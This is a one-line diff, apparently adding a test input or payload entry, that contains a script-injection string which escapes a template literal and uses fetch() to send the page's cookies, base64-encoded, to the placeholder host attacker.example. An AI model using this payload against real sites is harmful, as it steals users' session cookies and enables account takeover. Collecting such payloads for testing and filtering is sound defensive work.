@@ -1,0 +1,1 @@
+`; fetch('https://attacker.example/exfil?d='+btoa(document.cookie)); //`
